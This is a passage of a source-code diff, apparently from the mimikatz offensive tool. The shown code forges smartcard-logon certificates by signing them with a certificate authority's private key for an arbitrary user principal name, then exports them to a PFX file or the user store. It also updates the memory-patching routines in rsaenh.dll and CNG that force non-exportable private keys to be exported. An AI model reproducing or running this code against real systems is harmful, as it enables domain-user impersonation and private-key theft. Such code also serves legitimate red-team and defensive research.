+														if(pbPublicKeyInfo = (PCERT_PUBLIC_KEY_INFO) LocalAlloc(LPTR, cbPublicKeyInfo))
+														{
+															if(CryptExportPublicKeyInfo(hProvCERT, keyInfos.dwKeySpec, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, pbPublicKeyInfo, &cbPublicKeyInfo))
+															{
+																CertInfo.SubjectPublicKeyInfo = *pbPublicKeyInfo;
+																if(CryptSignAndEncodeCertificate(hKeyCA, dwKeySpecCA, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, X509_CERT_TO_BE_SIGNED, &CertInfo, &CertInfo.SignatureAlgorithm, NULL, NULL, &szCertificate))
+																{
+																	if(Certificate = (PBYTE) LocalAlloc(LPTR, szCertificate))
+																	{
+																		if(CryptSignAndEncodeCertificate(hKeyCA, dwKeySpecCA, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, X509_CERT_TO_BE_SIGNED, &CertInfo, &CertInfo.SignatureAlgorithm, NULL, Certificate, &szCertificate))
+																		{
+																			if(kull_m_string_args_byName(argc, argv, L"pfx", &szPfx, NULL))
+																			{
+																				isExported = kull_m_crypto_DerAndKeyInfoToPfx(Certificate, szCertificate, &keyInfos, szPfx);
+																				kprintf(L"Private Export : %s - %s\n", szPfx, isExported ? L"OK" : L"KO");
+																			}
+																			else
+																			{
+																				isExported = kull_m_crypto_DerAndKeyInfoToStore(Certificate, szCertificate, &keyInfos, CERT_SYSTEM_STORE_CURRENT_USER, L"My", FALSE);
+																				kprintf(L"Private Store  : CERT_SYSTEM_STORE_CURRENT_USER/My - %s\n", isExported ? L"OK" : L"KO");
+																			}
+																		}
+																		else PRINT_ERROR_AUTO(L"CryptSignAndEncodeCertificate (data)");
+																		LocalFree(Certificate);
+																	}
+																}
+																else PRINT_ERROR_AUTO(L"CryptSignAndEncodeCertificate (init)");
+															}
+															else PRINT_ERROR_AUTO(L"CryptExportPublicKeyInfo (data)");
+															LocalFree(pbPublicKeyInfo);
+														}
+													}
+													else PRINT_ERROR_AUTO(L"CryptExportPublicKeyInfo (init)");
+													CryptDestroyKey(hKeyCERT);
+												}
+												else PRINT_ERROR_AUTO(L"CryptGenKey");
+
+												CryptReleaseContext(hProvCERT, 0);
+												if(!isExported || szPfx)
+												{
+													if(!CryptAcquireContext(&hProvCERT, keyInfos.pwszContainerName, keyInfos.pwszProvName, keyInfos.dwProvType, CRYPT_DELETEKEYSET | keyInfos.dwFlags))
+														PRINT_ERROR_AUTO(L"Unable to delete temp keyset");
+												}
+											}
+											else PRINT_ERROR_AUTO(L"CryptAcquireContext");
+											kuhl_m_crypto_c_sc_auth_Ext_Free(&Extensions[2]);
+										}
+										kuhl_m_crypto_c_sc_auth_Ext_Free(&Extensions[1]);
+									}
+									kuhl_m_crypto_c_sc_auth_Ext_Free(&Extensions[0]);
+								}
+								LocalFree(CertInfo.Subject.pbData);
+							}
+							CryptReleaseContext(hKeyCA, 0);
+						}
+						else PRINT_ERROR_AUTO(L"CryptAcquireCertificatePrivateKey");
+						CertFreeCertificateContext(pCertCtxCA);
+					}
+					else PRINT_ERROR_AUTO(L"CertFindCertificateInStore");
+					CertCloseStore(hCertStoreCA, CERT_CLOSE_STORE_FORCE_FLAG);
+				}
+				else PRINT_ERROR_AUTO(L"CertOpenStore");
+			}
+			else PRINT_ERROR(L"/upn:user@domain.local needed\n");
+		}
+		else PRINT_ERROR(L"/caname:CA-KIWI needed\n");
+
+		LocalFree(keyInfos.pwszContainerName);
+	}
+	return STATUS_SUCCESS;
 }
 
 BYTE PATC_WIN5_CPExportKey_EXPORT[]	= {0xeb};
@@ -680,13 +1077,12 @@ KULL_M_PATCH_GENERIC Capi4000References[] = {
 #endif
 NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 {
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
 	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModuleRsaEnh;
 	KULL_M_MEMORY_ADDRESS
-		aPattern4000Memory = {NULL, &hLocalMemory},
-		aPattern4001Memory = {NULL, &hLocalMemory},
-		aPatchMemory = {NULL, &hLocalMemory};
-	KULL_M_MEMORY_SEARCH sMemory = {{{K_CPExportKey, &hLocalMemory}, 0}, NULL};
+		aPattern4000Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
+		aPattern4001Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
+		aPatchMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
+	KULL_M_MEMORY_SEARCH sMemory = {{{K_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, NULL};
 	PKULL_M_PATCH_GENERIC currentReference4001, currentReference4000;
 	
 	currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), MIMIKATZ_NT_BUILD_NUMBER);
@@ -697,7 +1093,7 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 		aPattern4000Memory.address = currentReference4000->Search.Pattern;
 		aPatchMemory.address = currentReference4001->Patch.Pattern;
 
-		if(kull_m_process_getVeryBasicModuleInformationsForName(&hLocalMemory, L"rsaenh.dll", &iModuleRsaEnh))
+		if(kull_m_process_getVeryBasicModuleInformationsForName(&KULL_M_MEMORY_GLOBAL_OWN_HANDLE, L"rsaenh.dll", &iModuleRsaEnh))
 		{
 			sMemory.kull_m_memoryRange.size = iModuleRsaEnh.SizeOfImage - ((PBYTE) K_CPExportKey - (PBYTE) iModuleRsaEnh.DllBase.address);
 		
@@ -733,7 +1129,7 @@ KULL_M_PATCH_GENERIC CngReferences[] = {
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI81_SPCryptExportKey),	PTRN_WI81_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
+	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
 };
 #endif
 NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[])
